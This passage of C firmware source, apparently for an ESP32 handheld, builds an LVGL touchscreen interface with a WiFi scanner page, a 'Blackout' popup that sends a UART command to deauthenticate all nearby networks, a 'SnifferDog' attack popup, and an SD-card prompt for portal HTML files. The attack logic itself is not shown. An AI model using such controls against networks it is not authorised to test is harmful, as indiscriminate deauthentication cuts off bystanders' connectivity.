        lv_obj_set_style_radius(item, 8, 0);
        lv_obj_set_flex_flow(item, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_row(item, 4, 0);
        
        // SSID (or "Hidden" if empty)
        lv_obj_t *ssid_label = lv_label_create(item);
        if (strlen((char*)ap->ssid) > 0) {
            lv_label_set_text(ssid_label, (char*)ap->ssid);
        } else {
            lv_label_set_text(ssid_label, "(Hidden)");
        }
        lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_18, 0);
        lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
        
        // BSSID, Channel, RSSI, Auth
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
        
        lv_obj_t *info_label = lv_label_create(item);
        lv_label_set_text_fmt(info_label, "%s  |  CH%d  |  %d dBm  |  %s", 
                              bssid_str, ap->primary, ap->rssi, 
                              esp_modem_auth_mode_str(ap->authmode));
        lv_obj_set_style_text_font(info_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(info_label, lv_color_hex(0x888888), 0);
    }
}

// ESP Modem scan task
static void esp_modem_scan_task(void *arg)
{
    ESP_LOGI(TAG, "Starting ESP Modem WiFi scan task");
    
    // Initialize WiFi if not already done
    esp_err_t ret = esp_modem_wifi_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to initialize WiFi");
        
        bsp_display_lock(0);
        if (esp_modem_status_label) {
            lv_label_set_text(esp_modem_status_label, "WiFi init failed!");
        }
        if (esp_modem_spinner) {
            lv_obj_add_flag(esp_modem_spinner, LV_OBJ_FLAG_HIDDEN);
        }
        if (esp_modem_scan_btn) {
            lv_obj_clear_state(esp_modem_scan_btn, LV_STATE_DISABLED);
        }
        esp_modem_scan_in_progress = false;
        bsp_display_unlock();
        
        vTaskDelete(NULL);
        return;
    }
    
    // Clear previous results
    esp_modem_network_count = 0;
    memset(esp_modem_networks, 0, sizeof(wifi_ap_record_t) * ESP_MODEM_MAX_NETWORKS);
    
    // Start scan (blocking) via ESP-Hosted - use NULL for default config
    // Retry up to 3 times if WiFi state is not ready (common after first init)
    ESP_LOGI(TAG, "Starting WiFi scan via ESP-Hosted (default config)...");
    int max_retries = 3;
    for (int attempt = 0; attempt < max_retries; attempt++) {
        ret = esp_wifi_scan_start(NULL, true);
        if (ret == ESP_OK) {
            break;  // Scan started successfully
        }
        
        if (ret == ESP_ERR_WIFI_STATE && attempt < max_retries - 1) {
            ESP_LOGW(TAG, "WiFi not ready for scan (attempt %d/%d), waiting...", attempt + 1, max_retries);
            vTaskDelay(pdMS_TO_TICKS(1500));  // Wait 1.5s before retry
        } else {
            break;  // Other error or last attempt
        }
    }
    
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "WiFi scan failed after %d attempts: %s", max_retries, esp_err_to_name(ret));
        
        bsp_display_lock(0);
        if (esp_modem_status_label) {
            lv_label_set_text_fmt(esp_modem_status_label, "Scan failed: %s", esp_err_to_name(ret));
        }
        if (esp_modem_spinner) {
            lv_obj_add_flag(esp_modem_spinner, LV_OBJ_FLAG_HIDDEN);
        }
        if (esp_modem_scan_btn) {
            lv_obj_clear_state(esp_modem_scan_btn, LV_STATE_DISABLED);
        }
        esp_modem_scan_in_progress = false;
        bsp_display_unlock();
        
        vTaskDelete(NULL);
        return;
    }
    
    // Get scan results via ESP-Hosted
    uint16_t ap_count = 0;
    ret = esp_wifi_scan_get_ap_num(&ap_count);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get AP count: %s", esp_err_to_name(ret));
        ap_count = 0;
    }
    ESP_LOGI(TAG, "Scan complete. AP count from esp_wifi_scan_get_ap_num: %d", ap_count);
    
    // Only get records if we found some networks
    if (ap_count > 0) {
        // Limit to max networks
        if (ap_count > ESP_MODEM_MAX_NETWORKS) {
            ap_count = ESP_MODEM_MAX_NETWORKS;
        }
        
        // Get AP records via ESP-Hosted
        esp_modem_network_count = ap_count;
        ret = esp_wifi_scan_get_ap_records(&esp_modem_network_count, esp_modem_networks);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Failed to get AP records: %s", esp_err_to_name(ret));
            esp_modem_network_count = 0;
        }
    } else {
        ESP_LOGW(TAG, "Scan returned 0 networks - this might indicate antenna/firmware issue");
        esp_modem_network_count = 0;
    }
    
    ESP_LOGI(TAG, "Retrieved %d network records", esp_modem_network_count);
    
    // Update UI
    bsp_display_lock(0);
    
    if (esp_modem_spinner) {
        lv_obj_add_flag(esp_modem_spinner, LV_OBJ_FLAG_HIDDEN);
    }
    
    if (esp_modem_status_label) {
        lv_label_set_text_fmt(esp_modem_status_label, "Found %d networks", esp_modem_network_count);
    }
    
    // Update network list
    esp_modem_update_network_list();
    
    if (esp_modem_scan_btn) {
        lv_obj_clear_state(esp_modem_scan_btn, LV_STATE_DISABLED);
    }
    
    esp_modem_scan_in_progress = false;
    
    bsp_display_unlock();
    
    ESP_LOGI(TAG, "ESP Modem scan task finished");
    vTaskDelete(NULL);
}

// ESP Modem scan button click handler
static void esp_modem_scan_btn_click_cb(lv_event_t *e)
{
    (void)e;
    
    if (esp_modem_scan_in_progress) {
        ESP_LOGW(TAG, "ESP Modem scan already in progress");
        return;
    }
    
    esp_modem_scan_in_progress = true;
    
    // Disable button during scan
    lv_obj_add_state(esp_modem_scan_btn, LV_STATE_DISABLED);
    
    // Show spinner
    if (esp_modem_spinner) {
        lv_obj_clear_flag(esp_modem_spinner, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Update status
    if (esp_modem_status_label) {
        lv_label_set_text(esp_modem_status_label, "Scanning...");
    }
    
    // Clear previous results
    if (esp_modem_network_list) {
        lv_obj_clean(esp_modem_network_list);
    }
    
    // Start scan task
    xTaskCreate(esp_modem_scan_task, "esp_modem_scan", 8192, NULL, 5, NULL);
}

// ESP Modem back button handler
static void esp_modem_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "ESP Modem back button clicked, returning to tiles for tab %d", current_tab);
    
    tab_context_t *ctx = get_current_ctx();
    
    if (ctx->current_visible_page) {
        lv_obj_add_flag(ctx->current_visible_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Show ESP Modem page
static void show_esp_modem_page(void)
{
    // Delete tiles container if present
    if (tiles_container) {
        lv_obj_del(tiles_container);
        tiles_container = NULL;
    }
    
    // Delete scan page if present
    if (scan_page) {
        lv_obj_del(scan_page);
        scan_page = NULL;
        scan_btn = NULL;
        status_label = NULL;
        network_list = NULL;
        spinner = NULL;
    }
    
    // Delete observer page if present
    if (observer_page) {
        lv_obj_del(observer_page);
        observer_page = NULL;
        observer_start_btn = NULL;
        observer_stop_btn = NULL;
        observer_table = NULL;
        observer_status_label = NULL;
    }
    
    // Delete existing ESP Modem page if present
    if (esp_modem_page) {
        lv_obj_del(esp_modem_page);
        esp_modem_page = NULL;
    }
    
    lv_obj_t *scr = lv_scr_act();
    
    // Set dark background with orange tint
    lv_obj_set_style_bg_color(scr, lv_color_hex(0x1A1410), 0);
    
    // Create/update status bar and tab bar
    create_status_bar();
    create_tab_bar();
    update_portal_icon();
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create ESP Modem page container inside tab container
    esp_modem_page = lv_obj_create(container);
    lv_coord_t modem_scr_height = lv_disp_get_ver_res(NULL);
    lv_obj_set_size(esp_modem_page, lv_pct(100), modem_scr_height - 85);  // Account for status bar + tab bar
    lv_obj_align(esp_modem_page, LV_ALIGN_TOP_MID, 0, 85);  // Position below status bar + tab bar
    lv_obj_set_style_bg_color(esp_modem_page, lv_color_hex(0x1A1410), 0);
    lv_obj_set_style_border_width(esp_modem_page, 0, 0);
    lv_obj_set_style_pad_all(esp_modem_page, 16, 0);
    lv_obj_set_flex_flow(esp_modem_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(esp_modem_page, 12, 0);
    
    // Header container
    lv_obj_t *header = lv_obj_create(esp_modem_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Left side: Back button + Title
    lv_obj_t *left_cont = lv_obj_create(header);
    lv_obj_set_size(left_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(left_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(left_cont, 0, 0);
    lv_obj_set_style_pad_all(left_cont, 0, 0);
    lv_obj_set_flex_flow(left_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(left_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(left_cont, 12, 0);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(left_cont);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, esp_modem_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title
    lv_obj_t *title = lv_label_create(left_cont);
    lv_label_set_text(title, "Internal C6 WiFi");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, lv_color_make(255, 87, 34), 0);  // Deep Orange
    
    // Scan button container (for button + spinner)
    lv_obj_t *btn_cont = lv_obj_create(header);
    lv_obj_set_size(btn_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_cont, 0, 0);
    lv_obj_set_style_pad_all(btn_cont, 0, 0);
    lv_obj_set_flex_flow(btn_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_cont, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_cont, 12, 0);
    
    // Spinner (hidden by default)
    esp_modem_spinner = lv_spinner_create(btn_cont);
    lv_obj_set_size(esp_modem_spinner, 32, 32);
    lv_spinner_set_anim_params(esp_modem_spinner, 1000, 200);
    lv_obj_add_flag(esp_modem_spinner, LV_OBJ_FLAG_HIDDEN);
    
    // Scan button
    esp_modem_scan_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(esp_modem_scan_btn, 120, 40);
    lv_obj_set_style_bg_color(esp_modem_scan_btn, lv_color_make(255, 87, 34), 0);  // Deep Orange
    lv_obj_set_style_bg_color(esp_modem_scan_btn, lv_color_lighten(lv_color_make(255, 87, 34), 30), LV_STATE_PRESSED);
    lv_obj_set_style_bg_color(esp_modem_scan_btn, lv_color_hex(0x444444), LV_STATE_DISABLED);
    lv_obj_set_style_radius(esp_modem_scan_btn, 8, 0);
    lv_obj_add_event_cb(esp_modem_scan_btn, esp_modem_scan_btn_click_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *btn_label = lv_label_create(esp_modem_scan_btn);
    lv_label_set_text(btn_label, "SCAN");
    lv_obj_set_style_text_font(btn_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(btn_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(btn_label);
    
    // Status label
    esp_modem_status_label = lv_label_create(esp_modem_page);
    lv_label_set_text(esp_modem_status_label, "Press SCAN to search for networks (via ESP32C6)");
    lv_obj_set_style_text_font(esp_modem_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(esp_modem_status_label, lv_color_hex(0x888888), 0);
    
    // Network list container (scrollable)
    esp_modem_network_list = lv_obj_create(esp_modem_page);
    lv_obj_set_size(esp_modem_network_list, lv_pct(100), lv_pct(100));
    lv_obj_set_flex_grow(esp_modem_network_list, 1);
    lv_obj_set_style_bg_color(esp_modem_network_list, lv_color_hex(0x1A1410), 0);
    lv_obj_set_style_border_color(esp_modem_network_list, lv_color_hex(0x332820), 0);
    lv_obj_set_style_border_width(esp_modem_network_list, 1, 0);
    lv_obj_set_style_radius(esp_modem_network_list, 12, 0);
    lv_obj_set_style_pad_all(esp_modem_network_list, 8, 0);
    lv_obj_set_flex_flow(esp_modem_network_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(esp_modem_network_list, 8, 0);
    lv_obj_set_scroll_dir(esp_modem_network_list, LV_DIR_VER);
    
    // If we have existing scan results, show them
    if (esp_modem_network_count > 0) {
        lv_label_set_text_fmt(esp_modem_status_label, "Found %d networks (cached)", esp_modem_network_count);
        esp_modem_update_network_list();
    }
    
    // Auto-start scan when entering the page
    lv_obj_send_event(esp_modem_scan_btn, LV_EVENT_CLICKED, NULL);
}

//==================================================================================
// Blackout Attack Popup
//==================================================================================

// Close blackout popup helper
static void close_blackout_popup_ctx(tab_context_t *ctx)
{
    if (!ctx) return;
    ctx->blackout_running = false;
    if (ctx->blackout_popup_overlay) {
        lv_obj_del(ctx->blackout_popup_overlay);
        ctx->blackout_popup_overlay = NULL;
        ctx->blackout_popup = NULL;
    }
}

// Callback when user confirms "Yes" on blackout confirmation
static void blackout_confirm_yes_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Blackout confirmed - starting attack");
    
    // Close confirmation popup
    close_blackout_popup_ctx(ctx);
    
    // Show active attack popup
    show_blackout_active_popup();
}

// Callback when user clicks "No" on blackout confirmation
static void blackout_confirm_no_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Blackout cancelled by user");
    
    // Just close popup
    close_blackout_popup_ctx(ctx);
}

// Callback when user clicks "Stop" during blackout attack
static void blackout_stop_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Blackout stopped by user - sending stop command");
    
    // Send stop command to the correct UART based on this tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("stop");
    } else {
        uart_send_command("stop");
    }
    
    // Close popup
    close_blackout_popup_ctx(ctx);
    
    // Return to main screen
    show_main_tiles();
}

// Show blackout confirmation popup with skull and warning
static void show_blackout_confirm_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->blackout_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->blackout_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->blackout_popup_overlay);
    lv_obj_set_size(ctx->blackout_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->blackout_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->blackout_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->blackout_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->blackout_popup_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->blackout_popup = lv_obj_create(ctx->blackout_popup_overlay);
    lv_obj_set_size(ctx->blackout_popup, 500, 350);
    lv_obj_center(ctx->blackout_popup);
    lv_obj_set_style_bg_color(ctx->blackout_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->blackout_popup, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(ctx->blackout_popup, 3, 0);
    lv_obj_set_style_radius(ctx->blackout_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->blackout_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->blackout_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->blackout_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->blackout_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->blackout_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->blackout_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->blackout_popup, 16, 0);
    lv_obj_clear_flag(ctx->blackout_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Warning icon (skull not available in font, use warning symbol)
    lv_obj_t *skull_label = lv_label_create(ctx->blackout_popup);
    lv_label_set_text(skull_label, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_font(skull_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(skull_label, COLOR_MATERIAL_RED, 0);
    
    // Warning title
    lv_obj_t *title = lv_label_create(ctx->blackout_popup);
    lv_label_set_text(title, "BLACKOUT");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    
    // Warning message
    lv_obj_t *message = lv_label_create(ctx->blackout_popup);
    lv_label_set_text(message, "This will deauth all networks\naround you. Are you sure?");
    lv_obj_set_style_text_font(message, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(message, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_align(message, LV_TEXT_ALIGN_CENTER, 0);
    
    // Button container
    lv_obj_t *btn_container = lv_obj_create(ctx->blackout_popup);
    lv_obj_remove_style_all(btn_container);
    lv_obj_set_size(btn_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_container, 30, 0);
    lv_obj_set_style_pad_top(btn_container, 10, 0);
    
    // No button (green, safe option)
    lv_obj_t *no_btn = lv_btn_create(btn_container);
    lv_obj_set_size(no_btn, 120, 50);
    lv_obj_set_style_bg_color(no_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_radius(no_btn, 8, 0);
    lv_obj_add_event_cb(no_btn, blackout_confirm_no_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *no_label = lv_label_create(no_btn);
    lv_label_set_text(no_label, "No");
    lv_obj_set_style_text_font(no_label, &lv_font_montserrat_18, 0);
    lv_obj_center(no_label);
    
    // Yes button (red, dangerous option)
    lv_obj_t *yes_btn = lv_btn_create(btn_container);
    lv_obj_set_size(yes_btn, 120, 50);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, blackout_confirm_yes_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *yes_label = lv_label_create(yes_btn);
    lv_label_set_text(yes_label, "Yes");
    lv_obj_set_style_text_font(yes_label, &lv_font_montserrat_18, 0);
    lv_obj_center(yes_label);
}

// Show blackout active popup with Attack in Progress and Stop button
static void show_blackout_active_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->blackout_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Determine which UART to use based on this tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    
    // Send start_blackout command to this tab's UART
    if (active_tab == TAB_MBUS) {
        uart2_send_command("start_blackout");
    } else {
        uart_send_command("start_blackout");
    }
    ESP_LOGI(TAG, "Blackout using tab %d (%s)", active_tab, tab_transport_name(active_tab));
    ctx->blackout_running = true;
    
    // Create modal overlay
    ctx->blackout_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->blackout_popup_overlay);
    lv_obj_set_size(ctx->blackout_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->blackout_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->blackout_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(ctx->blackout_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->blackout_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    ctx->blackout_popup = lv_obj_create(ctx->blackout_popup_overlay);
    lv_obj_set_size(ctx->blackout_popup, 450, 300);
    lv_obj_center(ctx->blackout_popup);
    lv_obj_set_style_bg_color(ctx->blackout_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->blackout_popup, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(ctx->blackout_popup, 3, 0);
    lv_obj_set_style_radius(ctx->blackout_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->blackout_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->blackout_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->blackout_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->blackout_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->blackout_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->blackout_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->blackout_popup, 20, 0);
    lv_obj_clear_flag(ctx->blackout_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Warning icon
    lv_obj_t *skull_label = lv_label_create(ctx->blackout_popup);
    lv_label_set_text(skull_label, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_font(skull_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(skull_label, COLOR_MATERIAL_RED, 0);
    
    // Attack in progress title
    lv_obj_t *title = lv_label_create(ctx->blackout_popup);
    lv_label_set_text(title, "Attack in Progress");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    
    // Subtitle
    lv_obj_t *subtitle = lv_label_create(ctx->blackout_popup);
    lv_label_set_text(subtitle, "Deauthing all networks...");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0xAAAAAA), 0);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(ctx->blackout_popup);
    lv_obj_set_size(stop_btn, 180, 55);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, blackout_stop_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_STOP " Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_20, 0);
    lv_obj_center(stop_label);
}

//==================================================================================
// SnifferDog Attack Popup
//==================================================================================

// Close snifferdog popup helper
static void close_snifferdog_popup_ctx(tab_context_t *ctx)
{
    if (!ctx) return;
    ctx->snifferdog_running = false;
    if (ctx->snifferdog_popup_overlay) {
        lv_obj_del(ctx->snifferdog_popup_overlay);
        ctx->snifferdog_popup_overlay = NULL;
        ctx->snifferdog_popup = NULL;
    }
}

// Callback when user confirms "Yes" on snifferdog confirmation
static void snifferdog_confirm_yes_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "SnifferDog confirmed - starting attack");
    
    // Close confirmation popup
    close_snifferdog_popup_ctx(ctx);
    
    // Show active attack popup
    show_snifferdog_active_popup();
}

// Callback when user clicks "No" on snifferdog confirmation
static void snifferdog_confirm_no_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "SnifferDog cancelled by user");
    
    // Just close popup
    close_snifferdog_popup_ctx(ctx);
}

// ============================================================================
// SD CARD WARNING POPUP
// ============================================================================

// Helper to check if current tab has SD card
static bool current_tab_has_sd_card(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return false;
    
    if (tab_is_internal(current_tab)) {
        return internal_sd_present;
    }
    return ctx->sd_card_present;
}

// Close SD warning popup
static void close_sd_warning_popup(void)
{
    if (sd_warning_popup_overlay) {
        lv_obj_del(sd_warning_popup_overlay);
        sd_warning_popup_overlay = NULL;
        sd_warning_popup_obj = NULL;
    }
    sd_warning_pending_action = NULL;
}

// Callback when user clicks "Continue Anyway" on SD warning
static void sd_warning_continue_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "User chose to continue without SD card");
    
    // Set flag so that the action can proceed without showing warning again
    sd_warning_acknowledged = true;
    
    sd_warning_continue_cb_t action = sd_warning_pending_action;
    close_sd_warning_popup();
    
    // Execute the pending action if set
    if (action) {
        action();
    }
    
    // Reset flag after action completes
    sd_warning_acknowledged = false;
}

// Callback when user clicks "Cancel" on SD warning
static void sd_warning_cancel_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "User cancelled action due to missing SD card");
    close_sd_warning_popup();
}

// Show SD card warning popup
// continue_action: callback to execute if user clicks "Continue Anyway"
static void show_sd_warning_popup(sd_warning_continue_cb_t continue_action)
{
    if (sd_warning_popup_obj != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Store the pending action
    sd_warning_pending_action = continue_action;
    
    // Create modal overlay
    sd_warning_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(sd_warning_popup_overlay);
    lv_obj_set_size(sd_warning_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(sd_warning_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(sd_warning_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(sd_warning_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(sd_warning_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    sd_warning_popup_obj = lv_obj_create(sd_warning_popup_overlay);
    lv_obj_set_size(sd_warning_popup_obj, 500, 320);
    lv_obj_center(sd_warning_popup_obj);
    lv_obj_set_style_bg_color(sd_warning_popup_obj, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(sd_warning_popup_obj, lv_color_hex(0xFF5722), 0);  // Orange
    lv_obj_set_style_border_width(sd_warning_popup_obj, 3, 0);
    lv_obj_set_style_radius(sd_warning_popup_obj, 16, 0);
    lv_obj_set_style_shadow_width(sd_warning_popup_obj, 30, 0);
    lv_obj_set_style_shadow_color(sd_warning_popup_obj, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(sd_warning_popup_obj, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(sd_warning_popup_obj, 20, 0);
    lv_obj_set_flex_flow(sd_warning_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(sd_warning_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(sd_warning_popup_obj, 16, 0);
    lv_obj_clear_flag(sd_warning_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Warning icon
    lv_obj_t *icon_label = lv_label_create(sd_warning_popup_obj);
    lv_label_set_text(icon_label, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon_label, lv_color_hex(0xFF5722), 0);  // Orange
    
    // Title
    lv_obj_t *title = lv_label_create(sd_warning_popup_obj);
    lv_label_set_text(title, "NO SD CARD DETECTED");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, lv_color_hex(0xFF5722), 0);
    
    // Warning message
    lv_obj_t *message = lv_label_create(sd_warning_popup_obj);
    lv_label_set_text(message, "This feature requires SD card\nfor HTML portal files.\nContinue anyway?");
    lv_obj_set_style_text_font(message, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(message, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_align(message, LV_TEXT_ALIGN_CENTER, 0);
    
    // Button container
    lv_obj_t *btn_container = lv_obj_create(sd_warning_popup_obj);
    lv_obj_remove_style_all(btn_container);
    lv_obj_set_size(btn_container, lv_pct(100), LV_SIZE_CONTENT);
